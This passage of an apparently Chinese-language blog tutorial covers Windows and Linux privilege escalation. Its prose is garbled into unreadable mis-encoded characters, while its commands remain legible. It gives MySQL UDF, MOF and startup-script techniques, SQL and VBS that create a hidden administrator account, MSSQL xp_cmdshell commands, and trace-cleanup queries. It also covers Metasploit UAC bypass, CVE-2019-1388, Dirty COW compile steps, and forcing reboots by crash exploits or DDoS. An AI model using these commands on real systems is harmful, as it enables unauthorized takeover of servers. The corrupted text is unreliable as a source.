‡æœºè¡¥ä¸è®°å½•-&gt;åˆ¤æ–­æ²¡æ‰“çš„è¡¥ä¸ï¼Œå¯»æ‰¾EXP-&gt;åˆ©ç”¨expææƒ</strong></p><ol><li>cmdä¸­systeminfoæŸ¥çœ‹è¡¥ä¸å®‰è£…æƒ…å†µ</li><li>ä½¿ç”¨è¡¥ä¸åœ¨çº¿æŸ¥è¯¢å·¥å…·:<code>http://blog.neargle.com/win-powerup-exp-index/#</code></li><li>å°†systeminfoå‘½ä»¤å¾—åˆ°çš„è¡¥ä¸ä¿¡æ¯å¤åˆ¶è¿›å»ï¼Œå°±ä¼šç»™å‡ºå¯ç”¨çš„expç¼–å·</li><li>githubä½œè€…æ•´åˆäº†å¤§éƒ¨åˆ†expï¼š<code>http://github.com/SecWiki/windows-kernel-exploits</code>(windows-kernelå°±æ˜¯ä»£è¡¨windowså†…æ ¸)</li><li>å°†expä¸Šä¼ è‡³ç›®æ ‡æœº</li></ol><ul><li>æ¯ä¸ªEXPçš„ä½¿ç”¨æ–¹æ³•ä¸åŒã€‚å¦‚ms14-058ä¸Šä¼ äº†expåˆ°é¶æœºååœ¨cmdä½¿ç”¨<code>exp.exe &quot;å‘½ä»¤&quot;</code>å°±èƒ½ä»¥systemæƒé™æ‰§è¡Œå‘½ä»¤ã€‚å…¶ä»–expçš„ä½¿ç”¨æ–¹æ³•å¾ˆå¯èƒ½ä¸åŒ</li><li>è·å¾—äº†é«˜æƒé™åœ¨å½“å‰ç½‘ç»œç¯å¢ƒåˆ‡å¿Œå¼€3389å»è¿ï¼Œå¯ä»¥ç”¨msfvenomç”Ÿæˆæœ¨é©¬ç»´æƒï¼Œæˆ–è€…åˆ›å»ºæ–°ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ã€‚ä¸è¿‡éƒ½ä¼šè¢«å‘ç°ã€‚ã€‚</li><li>é¶æœºä¸Šåœ¨è¿è¡Œmsfæœ¨é©¬æ—¶è¦ç”¨é«˜æƒé™è¿è¡Œï¼Œå¦åˆ™åå¼¹å›æ¥çš„shellä¹Ÿæ˜¯ä½æƒé™ã€‚æ‰€ä»¥è¦ç”¨ä¹‹å‰ä¼ ä¸Šå»çš„expè¿è¡Œmsfæœ¨é©¬</li></ul><h2 id="windowsæ•°æ®åº“ææƒ"><a href="#windowsæ•°æ®åº“ææƒ" class="headerlink" title="windowsæ•°æ®åº“ææƒ"></a>windowsæ•°æ®åº“ææƒ</h2><p>è¿™ç§ææƒæ–¹å¼å·²ç»ç”¨çš„å¾ˆå°‘äº†</p><h3 id="mysqlæ•°æ®åº“ææƒ"><a href="#mysqlæ•°æ®åº“ææƒ" class="headerlink" title="mysqlæ•°æ®åº“ææƒ"></a>mysqlæ•°æ®åº“ææƒ</h3><p>mysqlææƒçš„å¿…è¦æ¡ä»¶:è·å–Mysqlæ•°æ®åº“æœ€é«˜æƒé™<strong>root</strong>çš„è´¦å·å¯†ç </p><blockquote><p>è·å–æ–¹æ³•ï¼š</p><ol><li>æŸ¥çœ‹æ•°æ®åº“é…ç½®æ–‡ä»¶</li><li>ä¸‹è½½mysqlå®‰è£…è·¯å¾„ä¸‹çš„æ•°æ®æ–‡ä»¶å¹¶ç ´è§£</li></ol><ul><li>å®‰è£…è·¯å¾„ä¸‹çš„dataå­˜æ”¾çš„æ˜¯æ•°æ®åº“çš„ä¿¡æ¯ï¼Œrootçš„è´¦å·å¯†ç å­˜æ”¾åœ¨mysqlä¸‹çš„userè¡¨ä¸­ï¼Œå®Œæ•´è·¯å¾„&#x3D;å®‰è£…è·¯å¾„+data+mysql+user.myd</li></ul><ol start="3"><li>æš´åŠ›ç ´è§£</li></ol></blockquote><p><strong>mysqlçš„ä¸‰ç§ææƒæ–¹å¼ï¼š</strong></p><ol><li>udfææƒ</li><li>mofææƒ</li><li>å¯åŠ¨é¡¹ææƒ</li></ol><h4 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h4><ul><li><p>åŸç†ï¼šåˆ©ç”¨äº†c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;ç›®å½•ä¸‹çš„<strong>nullevt.mof</strong>æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶æ¯å‡ ç§’ä¼š<strong>æ‰§è¡Œ</strong>ä¸€æ¬¡ï¼Œå‘å…¶ä¸­å†™å…¥<strong>cmdå‘½ä»¤</strong>ä½¿å…¶è¢«æ‰§è¡Œ</p></li><li><p>åˆ©ç”¨æ¡ä»¶</p></li></ul><ol><li>windows&lt;&#x3D; 2003</li><li>å¯¹c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;ç›®å½•æœ‰è¯»å†™æƒé™</li><li>å¯ä»¥æ—¶é—´å†™mofæ–‡ä»¶åˆ°ç›¸åº”ç›®å½•ï¼Œå¦‚ï¼šæ•°æ®åº“å…è®¸å¤–è”ï¼Œæœ‰webshellï¼Œæœ‰å¯å†™sqlæ³¨å…¥</li></ol><p>å› ä¸ºéœ€è¦æœ‰å†™æ–‡ä»¶æƒé™(into outfile)ï¼Œæ‰€ä»¥å¯ç”¨åˆ°çš„ç¯å¢ƒå¾ˆå°‘</p><ul><li>ææƒæ–¹æ³•</li></ul><blockquote><ol><li>ä¸Šä¼ mofæ–‡ä»¶</li><li>æ‰§è¡Œload_fileå’Œinto dumpfileå°†æ–‡ä»¶å¯¼å‡ºåˆ°æŒ‡å®šä½ç½®<br><code>select load_file(&#39;mofç›®æ ‡è·¯å¾„&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</code></li></ol><p>nullevt.mofæ–‡ä»¶çš„å†…å®¹<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><h4 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h4><ul><li><p>åŸç†ï¼šUDF(user defined function)ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°é€šè¿‡æ·»åŠ æ–°å‡½æ•°ï¼Œå¯¹mysqlæœåŠ¡å™¨è¿›è¡ŒåŠŸèƒ½æ‰©å……ï¼Œå°†mysqlè´¦å·è½¬åŒ–ä¸ºsystemæƒé™ã€‚</p></li><li><p>æ–¹å¼ï¼šé€šè¿‡rootæƒé™å¯¼å‡ºudf.dllåˆ°ç³»ç»Ÿç›®å½•ä¸‹ï¼Œä½¿udf.dellè°ƒç”¨cmd</p></li><li><p>åˆ©ç”¨æ¡ä»¶ï¼š</p></li></ul><ol><li>windows 2000\XP\2003</li><li>è´¦å·å¯¹mysqlæœ‰æ’å…¥å’Œåˆ é™¤æƒé™</li><li>å¯¹åº”ç›®å½•æœ‰å†™æƒé™</li></ol><blockquote><p>mysqlç‰ˆæœ¬å¯¹åº”çš„udf.dllå¯¼å‡ºè·¯å¾„ï¼š</p><table><thead><tr><th>æ•°æ®åº“ç‰ˆæœ¬</th><th>æ“ä½œç³»ç»Ÿ</th><th>udf.dllå¯¼å‡ºè·¯å¾„</th></tr></thead><tbody><tr><td>&lt;5.0</td><td>æ‰€æœ‰æ“ä½œç³»ç»Ÿ</td><td>è·¯å¾„éšæ„</td></tr><tr><td>&lt;&#x3D;5.1</td><td>windows2003</td><td>c:\windows\system32\udf.dll</td></tr><tr><td>&lt;&#x3D;5.1</td><td>windows2000</td><td>c:\winnt\system32\udf.dll</td></tr><tr><td>&gt;5.1</td><td>æ‰€æœ‰æ“ä½œç³»ç»Ÿ</td><td>mysql<strong>å®‰è£…ç›®å½•ä¸‹çš„lib\plugin\udf.dll</strong></td></tr></tbody></table><p>mysqlå®‰è£…ç›®å½•æŸ¥è¯¢è¯­å¥ï¼š <code>select @@basedir</code></p></blockquote><ul><li>udf ææƒæ­¥éª¤</li></ul><ol><li>select user();\version();\basedir()åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬ã€ç”¨æˆ·å’Œå®‰è£…ç›®å½•</li><li>å¦‚æœ\lib\pluginç›®å½•ä¸å­˜åœ¨ï¼Œå¯ä»¥åˆ©ç”¨NTFS ADSæµåˆ›å»ºæ–‡ä»¶å¤¹<br><code>select &#39;xxx&#39; into dumpfile &#39;mysqlç›®å½•\\lib:$INDEX_ALLOCATION&#39;;</code><br><code>select &#39;xxx&#39; into dumpfile &#39;mysqlç›®å½•\\lib\plugin:$INDEX_ALLOCATION&#39;;</code><br>æˆ–è€…æ˜¯webshellç›´æ¥åˆ›å»º</li><li>å¯¼å…¥udf.dllæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åœ¨sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;ç›®å½•ä¸‹æœ‰ï¼Œåªæ˜¯è¯¥dllæ–‡ä»¶æ˜¯é€šè¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œå¯ä»¥ä½¿ç”¨sqlmap&#x2F;extra&#x2F;cloak.pyè§£å¯†ã€‚</li><li>ä¸Šä¼ udf.dllåˆ°æŒ‡å®šç›®å½•ã€‚æœ‰webshellå°±ç›´æ¥ä¼ ï¼Œä¼ ä¸äº†å°±select load_file()ã€‚</li><li>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ã€‚<code>create function **sys_eval** returns string soname &#39;udf.dll&#39;;</code><br>å¿…é¡»è¦åˆ›å»º.dllæ–‡ä»¶ä¸­å­˜åœ¨çš„å‡½æ•°æ‰è¡Œï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€udf.dllæ–‡ä»¶æ…¢æ…¢æ‰¾å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ç”¨dumpbin.exeæŸ¥çœ‹ã€‚sonameæŒ‡å‘åŠ¨æ€é“¾æ¥åº“</li><li>æ‰§è¡Œé«˜æƒé™æŒ‡ä»¤ï¼š<code>select sys_eval(&#39;whoami&#39;);</code><br>å°†è¯¥ç”¨æˆ·æå‡ä¸ºç®¡ç†å‘˜æƒé™ï¼š<code>select sys_eval(&quot;net localgroup administrators ichunqiu /add&quot;)</code></li><li>æ¸…é™¤ç—•è¿¹<br><code>drop function sys_eval;</code><br><code>delete from mysql.func where name=&quot;sys_eval&quot;;</code></li></ol><h4 id="å¯åŠ¨é¡¹ææƒ"><a href="#å¯åŠ¨é¡¹ææƒ" class="headerlink" title="å¯åŠ¨é¡¹ææƒ"></a>å¯åŠ¨é¡¹ææƒ</h4><ul><li>åŸç†ï¼šwindowså¼€æœºæ—¶å€™éƒ½ä¼šæœ‰ä¸€äº›å¼€æœºå¯åŠ¨çš„ç¨‹åºï¼Œé‚£æ—¶å€™å¯åŠ¨çš„ç¨‹åºæƒé™éƒ½æ˜¯systemï¼Œå› ä¸ºæ˜¯systemæŠŠä»–ä»¬å¯åŠ¨çš„ï¼Œåˆ©ç”¨è¿™ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†è‡ªåŠ¨åŒ–è„šæœ¬å†™å…¥å¯åŠ¨é¡¹ï¼Œè¾¾åˆ°ææƒçš„ç›®çš„ã€‚å°†ä¸€æ®µvbsè„šæœ¬å¯¼å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œå¦‚æœç®¡ç†å‘˜é‡å¯äº†æœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°±ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„ç”¨æˆ·æ·»åŠ åŠææƒå‘½ä»¤</li><li>åˆ©ç”¨æ¡ä»¶ï¼š</li></ul><ol><li>ç›®æ ‡ç›®å½•å¯è¯»å†™</li><li>è°ƒç”¨çš„cmdè¦æœ‰è¶³å¤Ÿæƒé™</li><li>é‡å¯æœåŠ¡å™¨å¯ä»¥åˆ©ç”¨å¯¼è‡´æœåŠ¡å™¨è“å±çš„expï¼Œæˆ–è€…ddos</li></ol><ul><li>ææƒæ–¹å¼</li></ul><ol><li>ç›´æ¥å°†vbsææƒè„šæœ¬ä¸Šä¼ åˆ°å¯åŠ¨é¡¹ç›®å½•ä¸‹</li><li>sqlå‘½ä»¤åˆ›å»ºæ·»åŠ vbsè„šæœ¬</li></ol><p>vbsææƒè„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)</span><br><span class="line">os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName</span><br><span class="line">Set ob=GetObject(os) #å¾—åˆ°adsiæ¥å£</span><br><span class="line">Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;) #ç”¨æˆ·ç»„</span><br><span class="line">Set od=ob.Create(&quot;user&quot;,&quot;name&quot;) #nameä¸ºç”¨æˆ·å</span><br><span class="line">od.SetPassword &quot;passwd&quot; #passwdä¸ºå¯†ç </span><br><span class="line">od.SetInfo #ä¿å­˜</span><br><span class="line">Set of=GetObject(os&amp;&quot;/name&quot;,user) #å¾—åˆ°ç”¨æˆ·</span><br><span class="line">oe.add os&amp;&quot;/name&quot;</span><br></pre></td></tr></table></figure><ul><li>sqlå‘½ä»¤åˆ›å»º</li></ul><ol><li>è¿æ¥åˆ°å¯¹æ–¹MySQLæœåŠ¡å™¨,è¿›å…¥åæŸ¥çœ‹æ•°æ®åº“ä¸­æœ‰å“ªäº›æ•°æ®è¡¨</li></ol><ul><li>å‘½ä»¤:show tables</li><li>é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œtestä¸­æ²¡æœ‰ä»»ä½•è¡¨çš„å­˜åœ¨ã€‚</li></ul><ol start="2"><li><p>è¿›å…¥testæ•°æ®åº“ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„è¡¨:<br><code>create table a(cmd text)</code>&#x2F;&#x2F;åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„è¡¨ï¼Œåä¸ºaï¼Œè¡¨ä¸­åªå­˜æ”¾äº†ä¸€ä¸ªå­—æ®µï¼Œå­—æ®µåä¸ºcmdï¼Œä¸ºtextæ–‡æœ¬</p></li><li><p>åœ¨è¡¨ä¸­æ’å…¥å†…å®¹ï¼Œç”¨è¿™ä¸‰æ¡å‘½ä»¤æ¥å»ºç«‹ä¸€ä¸ªVBSçš„è„šæœ¬ç¨‹åº:</p></li></ol><p><code>insert into a values(&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;);</code><br><code>insert into a values(&quot;a=wshshell.run(&quot;&quot;cmd.exe /c net user name passwd /add&quot;&quot;,0)&quot;);</code><br><code>insert into a values(&quot;b=wshshell.run(&quot;&quot;cmd.exe /c net localgroup administrators name /add&quot;&quot;,0)&quot;);</code></p><ol start="4"><li><p>è¾“å‡ºè¡¨ä¸ºä¸€ä¸ªVBSçš„è„šæœ¬æ–‡ä»¶<br><code>select * from a into dumpfile &quot;C:\Documents and Settings\Administrator\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨1.vbs&quot;;</code></p></li><li><p>åˆ©ç”¨å…¶ä»–æ‰‹æ®µé‡å¯ç”µè„‘</p></li></ol><h3 id="sql-serverææƒ"><a href="#sql-serverææƒ" class="headerlink" title="sql serverææƒ"></a>sql serverææƒ</h3><ul><li>åˆ©ç”¨æ¡ä»¶</li></ul><ol><li>å¿…é¡»è·å¾—saçš„è´¦å·å¯†ç æˆ–è€…ä¸saç›¸åŒç»™æƒé™çš„è´¦å·å¯†ç ï¼Œä¸”mssqlæ²¡æœ‰è¢«é™æƒ</li><li>èƒ½æ‰§è¡Œsqlè¯­å¥ã€‚å¦‚webshellæˆ–è€…1433ç«¯å£è¿æ¥</li></ol><p>åœ¨windowsï¼Œsaè´¦å·é€šå¸¸æ˜¯è¢«é™æƒä¸ºdb-ownerçš„ã€‚è€Œä¸æ˜¯sysadmin</p><ul><li>è·å–saå·å¯†çš„æ–¹æ³•ï¼š</li></ul><blockquote><ol><li>webshellæˆ–æºç è·å–ã€‚ä¸€èˆ¬åœ¨ç½‘ç«™çš„é…ç½®æ–‡ä»¶ä¸­å­˜äº†æ˜æ–‡è´¦å·å¯†ç ï¼Œå¸¸ç”¨é…ç½®æ–‡ä»¶å¦‚ï¼šconn.aspxã€config.aspxã€config.phpç­‰<br>ä¸€èˆ¬æ ¼å¼å¦‚ï¼šserver&#x3D;localhost;UID&#x3D;sa;PWD&#x3D;passwd;database&#x3D;db</li><li>æºç æ³„éœ²</li><li>å—…æ¢ã€‚åœ¨å±€åŸŸç½‘ä¸­ç”¨Cainç­‰å·¥å…·è¿›è¡Œarpå—…æ¢çš„æ—¶å€™å¯ä»¥æŠ“å–åˆ°1433ç«¯å£çš„æ•°æ®åº“æ˜æ–‡ç™»å½•</li><li>æš´åŠ›ç ´è§£</li></ol></blockquote><h4 id="xp-cmdshellææƒ"><a href="#xp-cmdshellææƒ" class="headerlink" title="xp_cmdshellææƒ"></a>xp_cmdshellææƒ</h4><blockquote><ul><li>xp_cmdshell:</li></ul><ol><li>å­˜å‚¨è¿‡ç¨‹ï¼šæ˜¯å­˜å‚¨åœ¨SQLServerä¸­é¢„å…ˆå®šä¹‰å¥½çš„â€sqlè¯­è¨€é›†åˆâ€ï¼Œä½¿ç”¨T-SQLè¯­è¨€ç¼–å†™å¥½çš„è„šæœ¬å…±åŒç»„æˆçš„é›†åˆä½“ä¸ºå­˜å‚¨è¿‡ç¨‹</li><li>xp_cmdshellè„šæœ¬ï¼šæ‰©å±•å­˜å‚¨è¿‡ç¨‹çš„è„šæœ¬ï¼Œæ˜¯å±é™©æ€§æœ€é«˜çš„è„šæœ¬ï¼Œå¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„ä»»ä½•æŒ‡ä»¤</li><li>xp_cmdshellåœ¨mssql2000ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œåœ¨mssql2005åçš„ç‰ˆæœ¬ä¸­é»˜è®¤ç¦æ­¢ã€‚å¦‚æœç”¨æˆ·å…·æœ‰saæƒé™å¯ä»¥ç”¨sp_configureé‡æ–°å¼€å¯</li></ol></blockquote><p>xp_cmdshellææƒè¿‡ç¨‹ï¼š<br>ï¼ˆ2005ä»¥å‰çš„ç‰ˆæœ¬):</p><ol><li>è¿æ¥æ•°æ®åº“ï¼š<br><code>select ame from master.dbo.sysdatabases</code>è·å–æ‰€æœ‰çš„æ•°æ®åº“å</li><li>æŸ¥çœ‹å½“å‰ç‰ˆæœ¬<code>select @@version</code><br>åˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºsa<code>select is_srvrolemember(&#39;sysadmin&#39;)</code><br>åˆ¤æ–­æ˜¯å¦æœ‰publicæƒé™<code>select is_srvrolemember(&#39;public&#39;)</code><br>åˆ¤æ–­æ˜¯å¦æœ‰è¯»å†™æ–‡ä»¶æƒé™<code>select is_srvrolemember(&#39;db_owner&#39;)</code></li><li>æŸ¥çœ‹æ•°æ®åº“ä¸­æ˜¯å¦æœ‰xp_cmdshellæ‰©å±•å­˜å‚¨æ’ä»¶ï¼Œreturn 1åˆ™æœ‰<br><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;;</code></li></ol><p>ï¼ˆ2005åçš„ç‰ˆæœ¬)ï¼š</p><ol><li>å¼€å¯xp_cmdshell</li></ol><figure class="highlight plaintext"><figcaption><span>sp_configure 'show advance options',1;//å…è®¸ä¿®æ”¹é«˜çº§å‚æ•°</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmshell&#x27;,1;//æ‰“å¼€xp_cmdshellæ‰©å±•</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><ol start="2"><li>xp_cmdshellæ‰§è¡Œå‘½ä»¤</li></ol><figure class="highlight plaintext"><figcaption><span>master..xp_cmdshell 'net user name passwd</span><a href="/add'//æ·»åŠ ç”¨æˆ·name,å¯†ç passwd">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators name /add&#x27;//æ·»åŠ nameåˆ°ç®¡ç†å‘˜ç»„</span><br></pre></td></tr></table></figure><h3 id="windows-bypass-uac"><a href="#windows-bypass-uac" class="headerlink" title="windows bypass uac"></a>windows bypass uac</h3><p>uac(user acount control)å¯ä»¥é˜»æ­¢æœªæˆæƒçš„åº”ç”¨ç¨‹åºè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®</p><blockquote><p>uacçš„ä¸‰ç§è®¾ç½®è¦æ±‚ï¼š</p><ol><li>å§‹ç»ˆé€šçŸ¥</li><li>ä»…åœ¨ç³»ç»Ÿè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥ï¼ˆUacé»˜è®¤è®¾ç½®ï¼Œç¬¬ä¸‰æ–¹ä½¿ç”¨é«˜çº§åˆ«æƒé™æ—¶ä¼šæç¤ºæœ¬åœ°ç”¨æˆ·)</li><li>ä»ä¸æç¤º(ç”¨æˆ·ä¸ºç³»ç»Ÿç®¡ç†å‘˜æ—¶æ‰€æœ‰ç¨‹åºéƒ½ä¼šä»¥æœ€é«˜æƒé™è¿è¡Œ)</li></ol></blockquote><p>ç›¸å½“äºæ™®é€šç”¨æˆ·æ‰“å¼€cmdå’Œä»¥ç®¡ç†å‘˜è¿è¡Œcmdçš„å·®åˆ«ï¼Œæ™®é€šç”¨æˆ·ä»¥ç®¡ç†å‘˜èº«ä»½å¼€cmdå°±ä¼šå—åˆ°uacçš„é™åˆ¶ï¼Œè¾“å…¥ç®¡ç†å‘˜å¯†ç </p><h4 id="msf-bypass-uac"><a href="#msf-bypass-uac" class="headerlink" title="msf bypass uac"></a>msf bypass uac</h4><p>å‰æï¼šå·²ç»è·å¾—äº†ç›®æ ‡æœºå™¨çš„meterpreter shellï¼Œå½“å‰æƒé™ä¸ºæ™®é€šç”¨æˆ·</p><ul><li>bypassuacæ¨¡å—é€šè¿‡è¿›ç¨‹æ³¨å…¥ï¼Œåˆ©ç”¨å—ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡windows UAC,å®ƒå°†ä¸ºæˆ‘ä»¬ç”Ÿæˆå¦ä¸€ä¸ªå…³é—­UACçš„shell</li><li>bypassuac_injectionæ¨¡å—ç›´æ¥è¿è¡Œåœ¨å†…å­˜çš„åå°„DLLä¸­ï¼Œä¸ä¼šæ¥è§¦ç›®æ ‡æœºçš„ç¡¬ç›˜ï¼Œä»è€Œé™ä½äº†è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹å‡ºæ¥çš„æ¦‚ç‡</li><li>bypassuac_eventwræ¨¡å—é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®ï¼Œåœ¨å¯åŠ¨Windows fodhelper.exeåº”ç”¨ç¨‹åºæ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows 10 UAC</li></ul><p>msf exploit:&gt;<code>use exploit/windows/local/bypassuac</code><br>ç„¶åæ ¹æ®msf expå¯¹reverse_tcp(bind_tcp)ã€lhostç­‰è¿›è¡Œå‚æ•°è®¾ç½®</p><h4 id="åˆ©ç”¨ç³»ç»Ÿæ¼æ´bypass-uac"><a href="#åˆ©ç”¨ç³»ç»Ÿæ¼æ´bypass-uac" class="headerlink" title="åˆ©ç”¨ç³»ç»Ÿæ¼æ´bypass uac"></a>åˆ©ç”¨ç³»ç»Ÿæ¼æ´bypass uac</h4><p>CVEç¼–å·:CVE-2019-1388,windwosè¯ä¹¦å¯¹è¯æ¡†ç‰¹æƒæå‡æ¼æ´ã€‚è¡¥ä¸å·KB4524235 KB4525233</p><ul><li>æ¼æ´åŸç†ï¼šæ­¤æ¼æ´æ˜¯å› ä¸ºUACæœºåˆ¶è®¾å®šä¸ä¸¥å¯¼è‡´çš„ã€‚é»˜è®¤wdnowsä¼šåœ¨ä¸€ä¸ªå•ç‹¬çš„æ¡Œé¢secure desktopä¸Šæ˜¾ç¤ºæ‰€æœ‰UACæç¤ºã€‚è¿™äº›æç¤ºæ˜¯ç”±consent.exeçš„å¯æ‰§è¡Œæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯¥æ–‡ä»¶ä»¥NT AUTHORITY\SYSTEMèº«ä»½è¿è¡Œï¼Œå¹¶æœ‰systemçš„å®Œæ•´æƒé™</li></ul><blockquote><p>å¦‚æœåœ¨è¿è¡Œä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ—¶è§¦å‘äº†UACï¼Œåœ¨ç‚¹å‡» å±•ç¤ºè¯ä¹¦å‘è¡Œè€…çš„è¯¦ç»†ä¿¡æ¯ ä¹‹åï¼Œè¯ä¹¦é‡Œçš„Issued byå­—æ®µï¼Œè¿™ä¸ªå­—æ®µå¯¹åº”çš„å€¼å°±æ˜¯OIDã€‚è¯ä¹¦ä¼šè§£æOIDçš„å€¼ï¼Œwindowsæ²¡æœ‰ç¦ç”¨OIDå¤„çš„è¶…é“¾æ¥ï¼Œå°±å¯ä»¥åˆ©ç”¨ææƒ</p></blockquote><p>è¦èƒ½è¿3389</p><p>@[toc]</p><h1 id="Linuxææƒ"><a href="#Linuxææƒ" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h1><p>linuxææƒç›¸å¯¹äºwindowsçš„æ‰‹æ³•è¾ƒå•ä¸€ï¼Œå¤šäº†ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„suidææƒã€‚æœ‰å¾ˆå¤šæ—¶å€™ææƒå¹¶ä¸æ˜¯å¿…é¡»è¿›è¡Œçš„æ­¥éª¤</p><h2 id="linuxç³»ç»Ÿææƒ"><a href="#linuxç³»ç»Ÿææƒ" class="headerlink" title="linuxç³»ç»Ÿææƒ"></a>linuxç³»ç»Ÿææƒ</h2><p>linuxå’Œå†…æ ¸ææƒè·Ÿwindowsä¸€æ ·ï¼Œéƒ½è¦ä¸‹è½½å¯¹åº”æ¼æ´çš„è„šæœ¬ææƒ</p><p>uname -a è·å–æ“ä½œç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬å’Œå†…æ ¸æ¶æ„<br>id è·å–ç”¨æˆ·ä¿¡æ¯</p><ol><li>æŸ¥æ‰¾ç›¸å…³ç‰ˆæœ¬çš„å†…æ ¸æ¼æ´</li></ol><ul><li>expæœç´¢é“¾æ¥ï¼š<code>https://www.exploit-db.com/</code> (typeé€‰local)</li><li>expä¸‹è½½ï¼š<code>http://github.com/SecWiki/linux-kernel-exploits</code><br>ï¼ˆç§‘å­¦ä¸Šç½‘ï¼‰</li></ul><ol start="2"><li>ä¸Šä¼ expå¹¶ç¼–è¯‘<br>expæ˜¯.cæ–‡ä»¶ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨åéœ€è¦ç”¨gccç¼–è¯‘ã€‚.cppç”¨g++<br>ç¼–è¯‘ <code>gcc pwn.c -o pwn</code> (expä¸‹è½½æ–‡ä»¶é‡Œæœ‰å¯¹åº”çš„ç¼–è¯‘è¯´æ˜æ–‡æ¡£ï¼‰<br>è¿è¡Œ <code>./pwn</code><br>å¦‚æœç›®æ ‡æœºæ²¡æœ‰gccæˆ–è€…g++ï¼Œè‡ªå·±æ²¡æœ‰æƒé™ä¹Ÿè‚¯å®šä¸èƒ½å®‰è£…ã€‚å”¯ä¸€çš„åŠæ³•æ˜¯åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªå’ŒæœåŠ¡å™¨å†…æ ¸ç‰ˆæœ¬ç›¸åŒçš„ç¯å¢ƒï¼Œåœ¨é‡Œé¢ç¼–è¯‘å®Œæˆäº†å†ä¸Šä¼ è‡³é¶æœº</li></ol><p>windowsææƒæˆåŠŸååœ¨expåæ¥å‘½ä»¤å°±æ˜¯é«˜æƒé™è¿è¡Œï¼Œä½†æ˜¯linuxææƒæˆåŠŸæ˜¯è¿”å›ä¸€ä¸ªshellã€‚è„šæœ¬æ‰§è¡Œåè¿”å›shellå¤±è´¥ï¼Œå¯èƒ½æ˜¯éœ€è¦åå¼¹shell</p><h4 id="è„ç‰›ææƒå®ä¾‹"><a href="#è„ç‰›ææƒå®ä¾‹" class="headerlink" title="è„ç‰›ææƒå®ä¾‹"></a>è„ç‰›ææƒå®ä¾‹</h4><ol><li>idæŸ¥çœ‹ç›®æ ‡æœºç”¨æˆ·æƒé™</li><li>uname -aç›®æ ‡æœºçš„linxu kernel&gt;&#x3D;2.6.22è¿›è¡Œè„ç‰›ææƒ</li><li>å¯»æ‰¾å¯¹åº”exp &#96;<a href="http://github/FireFart/dirtycow">http://github/FireFart/dirtycow</a></li><li>expä¸‹è½½è‡³ç›®æ ‡æœºå¹¶ç¼–è¯‘ <code>gcc -pthread dirty.c -o dirty -lcrypt</code></li><li>å®Œæˆåï¼Œé”€æ¯firefartå¯†ç 